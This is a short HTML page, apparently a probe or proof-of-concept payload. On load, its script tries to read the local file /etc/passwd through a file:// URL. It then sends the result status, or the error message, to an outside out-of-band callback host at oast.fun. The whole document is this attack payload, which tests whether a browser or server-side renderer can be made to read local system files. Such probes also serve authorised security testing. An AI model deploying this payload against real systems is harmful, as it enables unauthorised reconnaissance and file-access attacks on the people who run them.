<!DOCTYPE html>
<html>
<head>
  <title>Fetch from Localhost</title>
</head>
<body>
<script>
fetch('file:///etc/passwd')
  .then(response => {
    fetch(`https://dwgorsbfamepzexmcgtvmeiecbvp3s30r.oast.fun/?status=${response.status}`, {
      method: 'GET'
    });
  })
  .catch(error => {
    fetch(`https://dwgorsbfamepzexmcgtvmeiecbvp3s30r.oast.fun/?error=${encodeURIComponent(error.toString())}`, {
      method: 'GET'
    });
  });
</script>
</body>
</html>
